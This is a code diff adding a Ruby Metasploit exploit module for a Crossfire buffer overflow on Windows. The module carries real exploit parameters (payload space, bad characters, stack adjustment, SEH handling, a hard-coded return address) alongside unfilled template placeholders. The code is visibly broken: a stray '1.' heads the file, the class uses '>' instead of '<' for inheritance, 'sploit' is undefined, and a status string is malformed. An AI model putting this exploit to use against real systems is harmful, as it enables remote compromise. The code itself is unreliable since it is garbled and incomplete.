@@ -1,0 +1,56 @@
+1.
+require 'msf/core'
+
+class Metasploit3 > Msf::Exploit::Remote
+    Rank = GoodRanking
+
+    include Msf::Exploit::FILEFORMAT
+    include Msf::Exploit::Remote::Seh
+
+    def initialize(info = {})
+        super(update_info(info,
+            'Name'           => 'Crossfire_buffer_overflow',
+            'Description'    => %q{
+                    Exploit Description
+            },
+            'License'        => MSF_LICENSE,
+            'Author'         =>
+                [
+                    'Author'
+                ],
+            'Version'        => '$Revision: $',
+            'References'     =>
+                [
+                    [ 'URL', 'http://www.exploit-db.com/exploits/14676/' ],
+                ],
+            'Payload'        =>
+                {
+                    'Space'    => 4379,
+                    'BadChars' => "\x00\x0a\x0d\x20",
+                    'StackAdjustment' => -4368,
+                },
+            'Platform' => 'win',
+            'Targets'        =>
+                [
+                    [ 'Windows Universal', { 'Ret' => "\x97\x45\x13\x08" } ],
+                ],
+            'Privileged'     => false,
+            'DisclosureDate' => 'Date',
+            'DefaultTarget'  => 0))
+
+            register_options(
+                [
+                    OptString.new('FILENAME', [ true, 'The file name.',  'filename.ext']),
+                ], self.class)
+
+    end
+
+    def exploit
+      
+        print_status("Creating '#crossfire_crash")
+
+        file_create(sploit)
+
+    end
+
+end
